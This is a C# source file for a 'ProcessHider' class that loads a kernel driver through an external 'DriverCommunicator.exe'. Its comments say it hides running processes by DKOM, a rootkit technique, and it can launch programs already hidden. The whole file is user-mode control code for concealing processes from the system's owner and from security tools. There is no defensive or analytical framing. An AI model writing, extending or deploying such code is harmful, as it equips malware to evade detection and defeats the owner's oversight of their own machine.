using System;
using System.Diagnostics;
using System.IO;

namespace Manager
{
    class ProcessHider
    {
        private static string processHiderPath;
        private static bool isActive;
        public ProcessHider()
        {
            if (ProcessHider.isActive)
                return;
            processHiderPath = Directory.GetCurrentDirectory() + "\\DriverCommunicator.exe";
            ProcessHider.isActive = InitDriver();
        }

        private bool InitDriver()
        {
            if (ProcessHider.isActive)
                return true;
            Process p = StartVisibleProcess(processHiderPath, "load");
            p.WaitForExit();
            return p.ExitCode == 0;
        }

        /// <summary>
        /// hides a process using DKOM
        /// </summary>
        /// <param name="p"> process object </param>
        /// <returns> boolean value that indicates if the operation succeeded </returns>
        public bool HideProc(Process p)
        {
            return HideProc(p.Id);
        }

        /// <summary>
        /// hides a process using DKOM
        /// </summary>
        /// <param name="pId"> process id </param>
        /// <returns> boolean value that indicates if the operation succeeded </returns>
        public bool HideProc(int pId)
        {
            Process p = new Process();
            p.StartInfo = new ProcessStartInfo(processHiderPath, "hide " + pId);
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            if (!p.Start())
                return false;
            p.WaitForExit();
            if (p.ExitCode != 0) // fail
                return false;
            return true;
        }

        /// <summary>
        /// starts a new process
        /// </summary>
        /// <param name="path"> path to exectuable (not certainly an .exe file)  file </param>
        /// <param name="args"> command arguments </param>
        /// <returns></returns>
        public Process StartVisibleProcess(string path, string args)
        {
            Process p = new Process();
            p.StartInfo = new ProcessStartInfo(path, args);
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            if (!p.Start())
                return null;
            return p;
        }

        /// <summary>
        /// starting and hiding the process
        /// </summary>
        /// <param name="path"> file path (or command) </param>
        /// <param name="args"> process arguments </param>
        /// <returns> a process object, if it fails then it retuens null </returns>
        public Process StartHiddenProcess(string path, string args)
        {
            Process p = this.StartVisibleProcess(path, args);
            if (p == null)
                return null;
            if (!this.HideProc(p))
            {
                p.Kill();
                return null;
            }
            return p;
        }
    }
}
